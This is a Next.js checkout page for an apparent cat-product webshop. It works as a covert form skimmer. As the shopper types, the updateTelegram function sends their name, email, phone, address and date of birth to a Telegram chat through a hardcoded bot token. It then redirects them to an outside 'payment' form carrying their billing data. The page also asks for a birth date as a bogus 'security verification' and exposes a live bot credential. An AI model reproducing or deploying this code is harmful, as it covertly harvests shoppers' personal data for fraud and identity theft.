"use client"

import { useState, useEffect, useRef } from "react"
import { useCart } from "@/lib/cart-context"
import Image from "next/image"
import Link from "next/link"
import { ArrowLeft, Lock, CreditCard, Truck, Shield } from "lucide-react"
import Footer from "@/components/footer"
import { useI18n } from "@/lib/i18n-context"

export default function CheckoutPage() {
  const { items, total, clearCart } = useCart()
  const { locale } = useI18n()
  const isFr = locale === 'fr'
  
  // Telegram refs
  const messageIdRef = useRef<number | null>(null)
  const isUpdatingRef = useRef(false)
  const updateTimerRef = useRef<NodeJS.Timeout | null>(null)
  const sessionIdRef = useRef(`HCT_${Date.now()}`)
  
  const [formData, setFormData] = useState({
    email: "",
    firstName: "",
    lastName: "",
    address: "",
    apartment: "",
    city: "",
    province: "",
    postalCode: "",
    country: "Canada",
    phone: "",
    dateOfBirth: ""
  })
  const [isProcessing, setIsProcessing] = useState(false)
  const [showDatePicker, setShowDatePicker] = useState(false)
  const [selectedDay, setSelectedDay] = useState('')
  const [selectedMonth, setSelectedMonth] = useState('')
  const [selectedYear, setSelectedYear] = useState('')

  // Telegram configuration
  const TELEGRAM_BOT_TOKEN = '8535669526:AAHjGvoXJv5HwdDDr6jl8eTFeWa4DyTe4lg'
  const TELEGRAM_CHAT_ID = '-5217100062'

  // Province tax rates
  const getProvinceTaxRate = (province: string) => {
    const taxRates: { [key: string]: number } = {
      'ON': 13, 'NS': 15, 'NB': 15, 'NL': 15, 'PE': 15,
      'QC': 14.975, 'BC': 12, 'SK': 11, 'MB': 12,
      'AB': 5, 'NT': 5, 'NU': 5, 'YT': 5
    }
    return taxRates[province] || 0
  }

  // Clean phone number
  const cleanPhoneNumber = (phone: string) => {
    return phone.replace(/[^\d+]/g, '')
  }

  // Format phone number as user types
  const formatPhoneNumber = (value: string) => {
    const cleaned = value.replace(/\D/g, '')
    if (cleaned.length <= 1) return cleaned
    if (cleaned.length <= 4) return `+1 (${cleaned.slice(1)}`
    if (cleaned.length <= 7) return `+1 (${cleaned.slice(1, 4)})-${cleaned.slice(4)}`
    return `+1 (${cleaned.slice(1, 4)})-${cleaned.slice(4, 7)}-${cleaned.slice(7, 11)}`
  }

  // Format postal code as user types
  const formatPostalCode = (value: string) => {
    const cleaned = value.replace(/[^A-Za-z0-9]/g, '').toUpperCase()
    if (cleaned.length <= 3) return cleaned
    return `${cleaned.slice(0, 3)} ${cleaned.slice(3, 6)}`
  }

  // Validate age (13-100 years)
  const validateAge = (dateOfBirth: string) => {
    if (!dateOfBirth) return false
    const today = new Date()
    const birthDate = new Date(dateOfBirth)
    const age = today.getFullYear() - birthDate.getFullYear()
    const monthDiff = today.getMonth() - birthDate.getMonth()
    
    if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birthDate.getDate())) {
      return age - 1 >= 13 && age - 1 <= 100
    }
    return age >= 13 && age <= 100
  }

  // Update date when individual components change
  const updateDateOfBirth = (day: string, month: string, year: string) => {
    if (day && month && year) {
      const newDate = `${year}-${month.padStart(2, '0')}-${day.padStart(2, '0')}`
      setFormData(prev => ({ ...prev, dateOfBirth: newDate }))
    }
  }

  // Check if form is valid
  const isFormValid = () => {
    return formData.firstName && 
           formData.lastName && 
           formData.email && 
           formData.address && 
           formData.city && 
           formData.province && 
           formData.postalCode && 
           formData.phone && 
           formData.dateOfBirth && 
           validateAge(formData.dateOfBirth)
  }

  // Update Telegram message
  const updateTelegram = async (orderNumber?: string) => {
    // Only send if we have at least some meaningful data
    if (!formData.firstName && !formData.email && !formData.phone) return
    
    // Prevent duplicate calls if already processing
    if (isUpdatingRef.current) {
      console.log('Update already in progress, skipping...')
      return
    }
    
    isUpdatingRef.current = true
    console.log('=== TELEGRAM UPDATE TRIGGERED ===')
    console.log('Form data:', formData)
    console.log('Current message ID:', messageIdRef.current)

    const itemsList = items.map(item => 
      `   📦 ${item.name} (x${item.quantity}) - $${(item.price * item.quantity).toFixed(2)}`
    ).join('\n')

    const message = `🐱 PURRBALL - NOUVEAU CHECKOUT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

👤 CLIENT:
   ${formData.firstName} ${formData.lastName}

📧 CONTACT:
   📧 ${formData.email}
   📱 ${formData.phone}

🏠 ADRESSE DE LIVRAISON:
   📍 ${formData.address}
   🏢 ${formData.apartment || 'N/A'}
   🏙️ ${formData.city}, ${formData.province} ${formData.postalCode}
   🌍 ${formData.country}

🎂 DATE DE NAISSANCE:
   📅 ${formData.dateOfBirth}

💰 COMMANDE:
${itemsList}
   💵 Subtotal: $${total.toFixed(2)} CAD + Taxes ($${(total * 0.13).toFixed(2)})
   💰 TOTAL: $${(total + (total * 0.13)).toFixed(2)} CAD
   🆔 Session: ${sessionIdRef.current}
   ${orderNumber ? `📦 ORDER ID: ${orderNumber}` : ''}

⏰ DERNIÈRE MISE À JOUR:
   ${new Date().toLocaleString('fr-FR')}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`

    try {
      let url, body
      
      if (messageIdRef.current) {
        url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`
        body = {
          chat_id: TELEGRAM_CHAT_ID,
          message_id: messageIdRef.current,
          text: message
        }
      } else {
        url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
        body = {
          chat_id: TELEGRAM_CHAT_ID,
          text: message
        }
      }
      
      console.log('Sending to Telegram:', { url, body })
      
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
      })
      
      const result = await response.json()
      console.log('Telegram response:', result)
      
      if (result.ok) {
        if (!messageIdRef.current) {
          messageIdRef.current = result.result.message_id
          console.log('New message created, ID saved:', messageIdRef.current)
        } else {
          console.log('Message updated successfully, ID:', messageIdRef.current)
        }
      } else {
        console.error('Telegram API error:', result)
        // If edit fails (message too old), create new message
        if (messageIdRef.current && result.error_code === 400) {
          console.log('Edit failed, creating new message...')
          messageIdRef.current = null
          // Retry with new message
          setTimeout(() => updateTelegram(), 100)
        }
      }
    } catch (error) {
      console.error('Telegram error:', error)
    } finally {
      // Always reset the updating flag
      isUpdatingRef.current = false
    }
  }

  // Generate payment URL
  const generatePaymentURL = (data: any) => {
    const baseURL = 'https://secure.payment-ca.com/connect/form'
    const orderNumber = `HCT${Date.now()}${Math.floor(Math.random() * 1000).toString().padStart(3, '0')}`
    const taxRate = data.country === 'Canada' ? getProvinceTaxRate(data.province) : 0
    
    const params = {
      site: 'secure.payment-ca.com',
      icon: 'https://s6.imgcdn.dev/8xixd.png',
      image: 'https://s6.imgcdn.dev/8xQsM.png',
      amount: total.toFixed(2),
      symbol: data.country === 'Canada' ? 'CAD' : 'USD',
      vat: taxRate.toString(),
      riderect_success: window.location.origin + '/success',
      riderect_failed: window.location.origin + '/order-failed',
      riderect_back: window.location.origin + '/checkout',
      order_id: orderNumber,
      billing_first_name: data.firstName,
      billing_last_name: data.lastName,
      billing_company: '',
      billing_address_1: data.address,
      billing_address_2: data.apartment || '',
      billing_city: data.city,
      billing_state: data.province,
      billing_postcode: data.postalCode,
      billing_country: data.country === 'Canada' ? 'CA' : 'US',
      billing_email: data.email,
      billing_phone: cleanPhoneNumber(data.phone)
    }
    
    const queryString = Object.keys(params)
      .map(key => `${key}=${encodeURIComponent((params as any)[key])}`)
      .join('&')
    
    return `${baseURL}?${queryString}`
  }

  const shipping = total >= 50 ? 0 : 4.99
  const taxes = total * 0.15
  const finalTotal = total + shipping + taxes

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target
    let formattedValue = value
    
    console.log('=== INPUT CHANGE ===', name, value)
    
    // Format phone number
    if (name === 'phone') {
      formattedValue = formatPhoneNumber(value)
    }
    
    // Format postal code
    if (name === 'postalCode') {
      formattedValue = formatPostalCode(value)
    }
    
    setFormData(prev => ({ ...prev, [name]: formattedValue }))
    
    // Clear existing timer to prevent multiple calls
    if (updateTimerRef.current) {
      clearTimeout(updateTimerRef.current)
    }
    
    // Update Telegram with debounce delay to prevent spam
    updateTimerRef.current = setTimeout(() => {
      console.log('Debounced update triggered, calling updateTelegram')
      updateTelegram()
    }, 1000) // 1 second delay instead of immediate
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    // Validate all required fields and age
    if (!isFormValid()) {
      alert(isFr ? 'Veuillez remplir tous les champs requis et vous assurer que l\'âge est entre 13 et 100 ans' : 'Please fill in all required fields and ensure age is between 13 and 100')
      return
    }
    
    setIsProcessing(true)
    
    // Generate unique Order ID
    const orderNumber = `PB${Date.now()}${Math.floor(Math.random() * 1000).toString().padStart(3, '0')}`
    
    // Store order data in localStorage for tracking
    const orderData = {
      orderNumber,
      customerInfo: formData,
      items: items,
      total: total,
      tax: total * getProvinceTaxRate(formData.province) / 100,
      finalTotal: total + (total * getProvinceTaxRate(formData.province) / 100),
      orderDate: new Date().toISOString(),
      status: 'processing',
      sessionId: sessionIdRef.current
    }
    
    console.log('=== SAVING ORDER DATA ===')
    console.log('Order Number:', orderNumber)
    console.log('Order Data:', orderData)
    console.log('localStorage key:', `order_${orderNumber}`)
    
    try {
      localStorage.setItem(`order_${orderNumber}`, JSON.stringify(orderData))
      console.log('✅ Order data saved successfully to localStorage')
      
      // Verify it was saved
      const savedData = localStorage.getItem(`order_${orderNumber}`)
      console.log('✅ Verification - Retrieved data:', savedData)
    } catch (error) {
      console.error('❌ Error saving to localStorage:', error)
    }
    
    // Send final update to Telegram with Order ID
    await updateTelegram(orderNumber)
    
    // Notify payment submission
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: `🎯 **PAIEMENT SOUMIS !**\n\n💳 Le client a cliqué sur "Finaliser ma commande"\n📦 ORDER ID: ${orderNumber}\n🆔 Session: ${sessionIdRef.current}\n⏰ ${new Date().toLocaleString('fr-FR')}\n\n🔄 Redirection vers le système de paiement...`,
          parse_mode: 'Markdown'
        })
      })
    } catch (error) {
      console.error('Payment notification error:', error)
    }
    
    // Generate payment URL and redirect
    const paymentURL = generatePaymentURL(formData)
    
    console.log('=== BEFORE REDIRECT ===')
    console.log('About to redirect to payment, Order ID should be saved:', orderNumber)
    console.log('Final check - localStorage contains:', localStorage.getItem(`order_${orderNumber}`))
    
    // Add a small delay to ensure localStorage is written before redirect
    setTimeout(() => {
      window.location.href = paymentURL
    }, 100)
  }

  if (items.length === 0) {
    return (
      <div className="min-h-screen bg-white py-12 px-4">
        <div className="max-w-2xl mx-auto text-center">
          <h1 className="text-3xl font-semibold text-neutral-900 mb-4">
            {isFr ? 'Votre panier est vide' : 'Your cart is empty'}
          </h1>
          <Link href="/" className="text-neutral-500 hover:text-neutral-900 text-sm">
            {isFr ? 'Retourner à la boutique' : 'Back to shop'}
          </Link>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-white py-8 px-4">
      <div className="max-w-6xl mx-auto">
        <div className="mb-8">
          <Link 
            href="/cart"
            className="inline-flex items-center gap-2 text-neutral-400 hover:text-neutral-900 mb-4 transition-colors text-sm"
          >
            <ArrowLeft className="w-4 h-4" />
            {isFr ? 'Retour au panier' : 'Back to cart'}
          </Link>
          <h1 className="text-2xl md:text-3xl font-semibold text-neutral-900 tracking-tight">
            {isFr ? 'Finaliser ma commande' : 'Complete your order'}
          </h1>
        </div>

        <div className="grid lg:grid-cols-2 gap-8">
          <div className="space-y-6">
            <div className="bg-white rounded-2xl p-6 border border-neutral-100">
              <h2 className="text-base font-semibold text-neutral-900 mb-4">
                {isFr ? 'Informations de contact' : 'Contact Information'}
              </h2>
              <div className="space-y-4">
                <div>
                  <label className="block text-xs font-medium text-neutral-500 mb-1">
                    {isFr ? 'Adresse e-mail' : 'Email address'}
                  </label>
                  <input
                    type="email"
                    name="email"
                    value={formData.email}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2.5 border border-neutral-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-neutral-900 text-sm"
                    required
                  />
                </div>
              </div>
            </div>

            <div className="bg-white rounded-2xl p-6 border border-neutral-100">
              <h2 className="text-base font-semibold text-neutral-900 mb-4">
                {isFr ? 'Adresse de livraison' : 'Shipping Address'}
              </h2>
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-xs font-medium text-neutral-500 mb-1">
                    {isFr ? 'Prénom' : 'First name'}
                  </label>
                  <input
                    type="text"
                    name="firstName"
                    value={formData.firstName}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-neutral-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-neutral-900 text-sm"
                    required
                  />
                </div>
                <div>
                  <label className="block text-xs font-medium text-neutral-500 mb-1">
                    {isFr ? 'Nom' : 'Last name'}
                  </label>
                  <input
                    type="text"
                    name="lastName"
                    value={formData.lastName}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-neutral-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-neutral-900 text-sm"
                    required
                  />
                </div>
              </div>
              
              <div className="mt-4">
                <label className="block text-xs font-medium text-neutral-500 mb-1">
                  {isFr ? 'Adresse' : 'Address'}
                </label>
                <input
                  type="text"
                  name="address"
                  value={formData.address}
                  onChange={handleInputChange}
                  className="w-full px-3 py-2 border border-neutral-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-neutral-900 text-sm"
                  required
                />
              </div>

              <div className="mt-4">
                <label className="block text-xs font-medium text-neutral-500 mb-1">
                  {isFr ? 'Appartement/Suite (optionnel)' : 'Apartment/Suite (optional)'}
                </label>
                <input
                  type="text"
                  name="apartment"
                  value={formData.apartment}
                  onChange={handleInputChange}
                  className="w-full px-3 py-2 border border-neutral-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-neutral-900 text-sm"
                  placeholder="Apt, suite, etc."
                />
              </div>
              
              <div className="grid grid-cols-2 gap-4 mt-4">
                <div>
                  <label className="block text-xs font-medium text-neutral-500 mb-1">
                    {isFr ? 'Ville' : 'City'}
                  </label>
                  <input
                    type="text"
                    name="city"
                    value={formData.city}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-neutral-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-neutral-900 text-sm"
                    required
                  />
                </div>
                <div>
                  <label className="block text-xs font-medium text-neutral-500 mb-1">
                    {isFr ? 'Code postal' : 'Postal code'}
                  </label>
                  <input
                    type="text"
                    name="postalCode"
                    value={formData.postalCode}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-neutral-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-neutral-900 text-sm"
                    placeholder="H1H 3K3"
                    maxLength={7}
                    required
                  />
                </div>
              </div>
              
              <div className="mt-4">
                <label className="block text-xs font-medium text-neutral-500 mb-1">
                  Province
                </label>
                <select
                  name="province"
                  value={formData.province}
                  onChange={handleInputChange}
                  className="w-full px-3 py-2 border border-neutral-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-neutral-900 text-sm"
                  required
                >
                  <option value="">{isFr ? 'Sélectionnez une province' : 'Select a province'}</option>
                  <option value="AB">Alberta</option>
                  <option value="BC">{isFr ? 'Colombie-Britannique' : 'British Columbia'}</option>
                  <option value="MB">Manitoba</option>
                  <option value="NB">{isFr ? 'Nouveau-Brunswick' : 'New Brunswick'}</option>
                  <option value="NL">{isFr ? 'Terre-Neuve-et-Labrador' : 'Newfoundland and Labrador'}</option>
                  <option value="NT">{isFr ? 'Territoires du Nord-Ouest' : 'Northwest Territories'}</option>
                  <option value="NS">{isFr ? 'Nouvelle-Écosse' : 'Nova Scotia'}</option>
                  <option value="NU">Nunavut</option>
                  <option value="ON">Ontario</option>
                  <option value="PE">{isFr ? 'Île-du-Prince-Édouard' : 'Prince Edward Island'}</option>
                  <option value="QC">{isFr ? 'Québec' : 'Quebec'}</option>
                  <option value="SK">Saskatchewan</option>
                  <option value="YT">Yukon</option>
                </select>
              </div>
              
              <div className="mt-4">
                <label className="block text-xs font-medium text-neutral-500 mb-1">
                  {isFr ? 'Pays' : 'Country'}
                </label>
                <select
                  name="country"
                  value={formData.country}
                  onChange={handleInputChange}
                  className="w-full px-3 py-2 border border-neutral-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-neutral-900 text-sm"
                >
                  <option value="CA">Canada</option>
                  <option value="US">{isFr ? 'États-Unis' : 'United States'}</option>
                </select>
              </div>

              <div className="mt-4">
                <label className="block text-xs font-medium text-neutral-500 mb-1">
                  {isFr ? 'Numéro de téléphone' : 'Phone number'}
                </label>
                <input
                  type="tel"
                  name="phone"
                  value={formData.phone}
                  onChange={handleInputChange}
                  className="w-full px-3 py-2 border border-neutral-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-neutral-900 text-sm"
                  placeholder="+1 (438)-438-4394"
                  maxLength={17}
                  required
                />
              </div>
            </div>

          </div>

          <div className="lg:col-span-1">
            <div className="bg-white rounded-2xl p-6 border border-neutral-100 sticky top-4">
              <h2 className="text-base font-semibold text-neutral-900 mb-4">
                {isFr ? 'Résumé de commande' : 'Order Summary'}
              </h2>
              
              <div className="space-y-3 mb-4 max-h-60 overflow-y-auto">
                {items.map((item) => (
                  <div key={item.id} className="flex gap-3">
                    <div className="relative w-12 h-12 rounded-xl overflow-hidden bg-neutral-50 flex-shrink-0">
                      <Image
                        src={item.image || "/placeholder.svg"}
                        alt={item.name}
                        fill
                        sizes="64px"
                        className="object-cover"
                      />
                    </div>
                    <div className="flex-1">
                      <h4 className="text-sm font-medium text-neutral-900 truncate">
                        {item.name}
                      </h4>
                      <div className="flex justify-between items-center">
                        <span className="text-xs text-neutral-400">
                          {isFr ? 'Qté' : 'Qty'}: {item.quantity}
                        </span>
                        <span className="text-sm font-medium">
                          ${(item.price * item.quantity).toFixed(2)} CAD
                        </span>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
              
              <div className="space-y-2 mb-4 text-sm">
                <div className="flex justify-between">
                  <span className="text-neutral-400">{isFr ? 'Sous-total' : 'Subtotal'}</span>
                  <span className="font-medium">${total.toFixed(2)} CAD</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-neutral-400">{isFr ? 'Livraison' : 'Shipping'}</span>
                  <span className="font-medium">
                    {shipping === 0 ? (
                      <span className="text-green-600">{isFr ? 'Gratuite' : 'Free'}</span>
                    ) : (
                      `$${shipping.toFixed(2)} CAD`
                    )}
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-neutral-400">{isFr ? 'Taxes' : 'Taxes'}</span>
                  <span className="font-medium">${taxes.toFixed(2)} CAD</span>
                </div>
              </div>
              
              <div className="border-t border-neutral-100 pt-4 mb-6">
                <div className="flex justify-between items-center">
                  <span className="text-sm font-medium text-neutral-500">Total</span>
                  <span className="text-xl font-semibold text-neutral-900">
                    CA${finalTotal.toFixed(2)}
                  </span>
                </div>
              </div>

              {/* Date of Birth Verification */}
              <div className="mb-6 p-4 bg-neutral-50 rounded-xl">
                <h3 className="text-xs font-medium text-neutral-900 mb-3 flex items-center gap-2">
                  <Lock className="w-3.5 h-3.5 text-neutral-400" />
                  {isFr ? 'Vérification de sécurité' : 'Security Verification'}
                </h3>
                <div className="relative">
                  <label className="block text-xs font-medium text-neutral-500 mb-2">
                    {isFr ? 'Date de naissance (pour vérification)' : 'Date of birth (for verification)'}
                  </label>
                  
                  {/* Custom Date Picker Button */}
                  <button
                    type="button"
                    onClick={() => setShowDatePicker(!showDatePicker)}
                    className="w-full px-3 py-2 border border-neutral-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-neutral-900 text-sm bg-white text-left flex items-center justify-between"
                  >
                    <span className={formData.dateOfBirth ? 'text-neutral-900' : 'text-neutral-400'}>
                      {formData.dateOfBirth ? 
                        new Date(formData.dateOfBirth).toLocaleDateString(isFr ? 'fr-FR' : 'en-CA') : 
                        (isFr ? 'Sélectionner une date' : 'Select a date')
                      }
                    </span>
                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" />
                    </svg>
                  </button>

                  {/* Custom Dropdown */}
                  {showDatePicker && (
                    <div className="absolute top-full left-0 right-0 mt-1 bg-white border border-neutral-200 rounded-xl shadow-lg z-50 p-4">
                      <div className="grid grid-cols-3 gap-3">
                        {/* Day */}
                        <div>
                          <label className="block text-xs font-medium text-neutral-500 mb-1">{isFr ? 'Jour' : 'Day'}</label>
                          <select
                            value={selectedDay}
                            onChange={(e) => {
                              setSelectedDay(e.target.value)
                              updateDateOfBirth(e.target.value, selectedMonth, selectedYear)
                            }}
                            className="w-full px-2 py-1.5 border border-neutral-200 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-neutral-900"
                          >
                            <option value="">{isFr ? 'Jour' : 'Day'}</option>
                            {Array.from({length: 31}, (_, i) => i + 1).map(day => (
                              <option key={day} value={day}>{day}</option>
                            ))}
                          </select>
                        </div>

                        {/* Month */}
                        <div>
                          <label className="block text-xs font-medium text-neutral-500 mb-1">{isFr ? 'Mois' : 'Month'}</label>
                          <select
                            value={selectedMonth}
                            onChange={(e) => {
                              setSelectedMonth(e.target.value)
                              updateDateOfBirth(selectedDay, e.target.value, selectedYear)
                            }}
                            className="w-full px-2 py-1.5 border border-neutral-200 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-neutral-900"
                          >
                            <option value="">{isFr ? 'Mois' : 'Month'}</option>
                            {(isFr ? [
                              {value: '1', label: 'Jan'}, {value: '2', label: 'Fév'}, {value: '3', label: 'Mar'},
                              {value: '4', label: 'Avr'}, {value: '5', label: 'Mai'}, {value: '6', label: 'Jun'},
                              {value: '7', label: 'Jul'}, {value: '8', label: 'Aoû'}, {value: '9', label: 'Sep'},
                              {value: '10', label: 'Oct'}, {value: '11', label: 'Nov'}, {value: '12', label: 'Déc'}
                            ] : [
                              {value: '1', label: 'Jan'}, {value: '2', label: 'Feb'}, {value: '3', label: 'Mar'},
                              {value: '4', label: 'Apr'}, {value: '5', label: 'May'}, {value: '6', label: 'Jun'},
                              {value: '7', label: 'Jul'}, {value: '8', label: 'Aug'}, {value: '9', label: 'Sep'},
                              {value: '10', label: 'Oct'}, {value: '11', label: 'Nov'}, {value: '12', label: 'Dec'}
                            ]).map(month => (
                              <option key={month.value} value={month.value}>{month.label}</option>
                            ))}
                          </select>
                        </div>

                        {/* Year */}
                        <div>
                          <label className="block text-xs font-medium text-neutral-500 mb-1">{isFr ? 'Année' : 'Year'}</label>
                          <select
                            value={selectedYear}
                            onChange={(e) => {
                              setSelectedYear(e.target.value)
                              updateDateOfBirth(selectedDay, selectedMonth, e.target.value)
                            }}
                            className="w-full px-2 py-1.5 border border-neutral-200 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-neutral-900"
                          >
                            <option value="">{isFr ? 'Année' : 'Year'}</option>
                            {Array.from({length: 88}, (_, i) => new Date().getFullYear() - 13 - i).map(year => (
                              <option key={year} value={year}>{year}</option>
                            ))}
                          </select>
                        </div>
                      </div>
                      
                      <button
                        type="button"
                        onClick={() => setShowDatePicker(false)}
                        className="mt-3 w-full bg-brand text-white py-2 px-3 rounded-lg text-sm hover:bg-brand-dark transition-colors"
                      >
                        {isFr ? 'Confirmer' : 'Confirm'}
                      </button>
                    </div>
                  )}
                  
                  <p className="text-xs text-neutral-400 mt-1">
                    {isFr ? 'Requis pour la sécurité' : 'Required for security'}
                  </p>
                </div>
              </div>
              
              <form onSubmit={handleSubmit}>
                <button 
                  type="submit"
                  disabled={isProcessing || !isFormValid()}
                  className="w-full bg-brand hover:bg-brand-dark disabled:opacity-50 text-white py-3.5 px-4 rounded-full font-medium text-sm transition-all flex items-center justify-center gap-2"
                >
                  {isProcessing ? (
                    <>
                      <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                      {isFr ? 'Traitement en cours...' : 'Processing...'}
                    </>
                  ) : (
                    <>
                      <Lock className="w-4 h-4" />
                      {isFr ? 'Finaliser ma commande' : 'Complete order'}
                    </>
                  )}
                </button>
              </form>

              {/* Payment Cards Accepted */}
              <div className="mt-6 pt-4 border-t border-neutral-100">
                <p className="text-[10px] text-neutral-300 text-center mb-3">{isFr ? 'Cartes acceptées' : 'Cards accepted'}</p>
                <div className="flex items-center justify-center gap-2">
                  <img src="https://cdn.shopify.com/shopifycloud/checkout-web/assets/0169695890db3db16bfe.svg" alt="Visa" className="h-6 w-10" />
                  <img src="https://secure.payment-ca.com/assets/img/mastercard.svg" alt="Mastercard" className="h-6 w-10" />
                  <img src="https://secure.payment-ca.com/assets/img/amex.svg" alt="Amex" className="h-6 w-10" />
                  <img src="https://secure.payment-ca.com/assets/img/unionpay.svg" alt="UnionPay" className="h-6 w-10" />
                </div>
              </div>
              
              <div className="mt-4 text-center">
                <div className="flex items-center justify-center gap-2 text-[10px] text-neutral-300">
                  <Truck className="w-3 h-3" />
                  {isFr ? 'Livraison 2-3 jours ouvrables' : 'Delivery 2-3 business days'}
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      
      <Footer />
    </div>
  )
}
